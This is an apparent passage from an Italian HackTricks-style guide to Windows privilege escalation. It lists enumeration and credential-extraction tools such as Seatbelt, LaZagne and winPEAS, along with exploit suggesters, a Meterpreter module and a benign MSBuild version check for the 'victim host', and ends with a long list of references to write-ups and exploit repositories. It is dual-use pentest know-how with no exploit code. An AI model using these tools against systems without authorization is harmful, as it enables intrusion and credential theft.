[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera l'host cercando misconfigurations (più uno strumento di raccolta informazioni che di privesc) (deve essere compilato) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Estrae credenziali da molti software (exe precompilato in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Porting di PowerUp in C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Controlla le misconfigurations (eseguibile precompilato in github). Non consigliato. Non funziona bene in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Controlla possibili misconfigurations (exe da python). Non consigliato. Non funziona bene in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Strumento creato sulla base di questo post (non ha bisogno di accesschk per funzionare correttamente ma può usarlo).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Legge l'output di **systeminfo** e raccomanda exploit funzionanti (python locale)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Legge l'output di **systeminfo** e raccomanda exploit funzionanti (python locale)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Devi compilare il progetto usando la versione corretta di .NET ([guarda questo](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Per vedere la versione installata di .NET sull'host vittima puoi fare:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Riferimenti

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: phishing con macro Word VBA tramite SMTP → decrittazione delle credenziali di hMailServer → Veeam CVE-2023-27532 fino a SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: leak della format-string + stack BOF → VirtualAlloc ROP (RCE) e furto del token del kernel](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse nelle ombre del kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Vulnerabilità del file system privilegiato presente in un sistema SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – uso di CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)

{{#include ../../banners/hacktricks-training.md}}
